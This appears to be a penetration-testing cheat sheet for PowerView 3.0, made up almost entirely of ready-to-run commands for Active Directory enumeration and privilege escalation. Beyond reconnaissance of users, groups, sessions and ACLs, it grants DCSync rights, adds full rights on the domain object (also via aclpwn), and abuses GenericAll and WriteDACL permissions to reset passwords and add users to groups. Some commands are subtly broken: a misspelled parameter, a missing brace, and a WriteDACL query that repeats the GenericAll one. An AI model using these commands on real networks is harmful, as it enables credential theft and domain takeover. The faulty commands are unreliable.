# PowerView 3.0

### Enumeration

Always download PowerView.ps1 from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) \(the non-dev version will be incompatible with a lot of guides\).

```text
Get-DomainController | Select-Object Forest, Name, OSVersion
Get-ForestDomain
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainUser -Identity <user> -Properties DisplayName, MemberOf | Format-List
Get-DomainComputer -Properties DnsHostName | Sort-Object -Property DnsHostName
Get-DomainOU -Properties Name | Sort-Object -Property Name
Get-DomainGroup -Identity 'Domain Admins' | Select-Object -ExpandProperty Member
Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberDistinguishedName
Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
Get-DomainGPO -ComputerIdentity <computer> -Properties DisplayName | Sort-Object -Property DisplayName
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
Find-DomainUserLocation | Select-Object UserName, SessionFromName
Get-NetLocalGroup | Select-Object GroupName
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
Get-NetLoggedOn
Get-NetSession -ComputerName <computer> | Select-Object CName, UserName
Get-DomainTrust
Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

### DCSync

#### Grant DCSync rights to user

```text
Add-ObjectACL -TargetIdentity "dc=<>,dc=<>,dc=<>" -PrincipalIdentity <user> -Rights DCSync -Verbose
```

#### Check for users allowed to DCSync

```text
Get-ObjectACL -DistinguishedName "dc=<>,dc=<>,dc=<>" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

### Add to the domain object

Requires the correct ACL.

```text
Add-ObjectAcl -TargetDistignuishedName 'DC=<dc>' -PrincipalSamAccountName <user> -Rights All -Verbose
```

This can also be automated via aclpwn:

```bash
aclpwn -f <username> -ft user -t <domain> -tt domain -d <domain> -dp BloodHound -du neo4j --server <dc> -u <username> -sp <sp> -p <password>
```

### Abuse GenericAll

Allows us to do whatever we want with the target object.

Find all Users the current user has GenericAll for:

```text
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}
```

We can change the users password with `net user <user> <newpassword> /domain`.

Find all Groups the current user has GenericAll for:

```text
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

We can add users to the group with `net group <group> <user> /add /domain`.

### Abuse WriteDACL

Allows to add new ACLs \(e.g. GenericAll\).

Find Users we have WriteDACL for:

```text
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

Add GenericAll:

```text
Add-DomainObjectAcl -TargetIdentity <targetuser> -PrincipalIdentity <user> -Rights All
```

